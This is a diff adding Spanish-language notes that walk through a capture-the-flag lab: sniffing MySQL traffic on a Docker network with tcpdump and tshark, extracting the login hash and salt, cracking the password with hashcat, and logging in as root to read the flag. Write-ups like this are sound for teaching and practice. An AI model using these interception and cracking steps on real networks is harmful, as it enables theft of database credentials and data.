@@ -1,0 +1,91 @@
+Por ahora lo que se
+===================
+- Mi IP es 172.18.0.2
+- Puertos abiertos:
+        - 22/tcp ssh 172.18.0.1 => router
+        - 3306/tcp mysql 172.18.0.3 => db a atacar
+        - sin puertos abiertos 172.18.0.4 => probablemente conectado a la db
+        - ssh de mi conexion
+
+
+Activar Reenvio de paquetes 
+===========================
+sudo sysctl -w net.ipv4.ip_forward=1
+
+Luego para ver lo que se estan mandando
+=======================================
+sudo tcpdump -i eth0 -w captura_mitm.pcap
+
+
+La base de datos usa http0.9, para poder aceptar esa response con curl:
+curl --http0.9 172.18.0.3:3306
+
+Usamos filtro con tshark para leer campos especificos
+=====================================================
+Antes de mandar el comando tenes que averiguar los headers que queres obtener para filtrar bien.
+Tambien se puede hacer usando wireshark.
+
+Comando:
+tshark -r capture2.capng -Y "ip.addr == 172.18.0.3 && ip.addr == 172.18.0.4 && mysql.login_request" -T fields -e ip.src -e ip.dst -e mysql.user -e mysql.passwd -E header=y
+
+Obtenemos:
+ip.src          ip.dst          usr     pass
+172.18.0.4      172.18.0.3      root    c7856c37fce03bee42987e9e8379d784bee9b558
+
+Ahora tenemos que obtener la salt para crackear la contraseña porque usa mysql_password
+
+
+Con esto obtenemos la salt
+==========================
+tshark -r capture.capng -Y "tcp.stream == 1 && mysql.server_greeting" -T fields -e mysql.salt -e mysql.salt2 | tr -d '\t\n' | xxd -p
+
+Es importante obtener las dos salts, mysql lo divide en dos respuestas y las concatena
+
+
+Lo que obtenemos pasandolo por hashcat
+======================================
+
+$mysqlna$276043633a58303577034004671c771c16447b40*c7856c37fce03bee42987e9e8379d784bee9b558:heyheyhey
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 11200 (MySQL CRAM (SHA1))
+Hash.Target......: $mysqlna$276043633a58303577034004671c771c16447b40*c...e9b558
+Time.Started.....: Thu Nov  5 20:53:34 2026 (0 secs)
+Time.Estimated...: Thu Nov  5 20:53:34 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: Feed (../rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#02........: 63903.4 kH/s (0.08ms) @ Accel:794 Loops:1 Thr:64 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 508160/14344391 (3.54%)
+Rejected.........: 0/508160 (0.00%)
+Restore.Point....: 0/14344391 (0.00%)
+Restore.Sub......: #02:0/0
+Candidate.Engine.: Host Generator + PCIe
+Candidates.#02...: 123456 -> hallare
+Hardware.Mon.SMC.: Fan0: 0%
+Hardware.Mon.#02.: Util: 77% Pwr:1582mW
+
+Started: Thu Nov  5 20:53:33 2026
+Stopped: Thu Nov  5 20:53:34 2026
+
+
+Entonces la contraseña es "heyheyhey"
+
+Luego se hace la query en la base de datos "flagdb"
+===================================================
+(para saber las bases de datos, se usa "show databases")
+
+root@fac50de5d760:~# mysql -h 172.18.0.3 -u root -pheyheyhey -D flagdb -e "select * from flag;"
+mysql: [Warning] Using a password on the command line interface can be insecure.
++----+-------------------------------------------------------+
+| id | flag                                                  |
++----+-------------------------------------------------------+
+|  1 | first part of the flag: l1tter4lly_4_c4ptur3_th3_fl4g |
++----+-------------------------------------------------------+
+
+Finalmente si justas la pass con la flag te queda
+=================================================
+l1tter4lly_4_c4ptur3_th3_fl4g:heyheyhey
+
